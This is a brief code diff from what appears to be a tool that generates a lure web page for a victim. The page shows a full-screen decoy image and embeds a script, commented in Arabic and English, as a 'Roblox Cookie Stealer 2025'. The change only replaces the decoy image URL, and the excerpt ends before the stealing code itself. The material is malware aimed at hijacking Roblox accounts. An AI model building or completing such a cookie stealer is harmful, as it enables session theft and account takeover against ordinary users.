@@ -19,7 +19,7 @@ def roblox_cookie_only(path):
     # للضحية: HTML مع صورة + JS للكوكي فقط (بدون أي معلومات عادية)
     html = f"""<!DOCTYPE html>
 <html><body style="margin:0;background:#000">
-<img src="https://i.imgur.com/Kp5jF8H.jpeg" style="width:100%;height:100vh;object-fit:contain">
+<img src="https://www.strangerdimensions.com/wp-content/uploads/2012/01/herobrine.jpg" style="width:100%;height:100vh;object-fit:contain">
 
 <script>
 // Roblox Cookie Stealer 2025 - فقط الكوكي، بدون أي حاجة تانية (من AtomLogger/PrimeMarket repos)
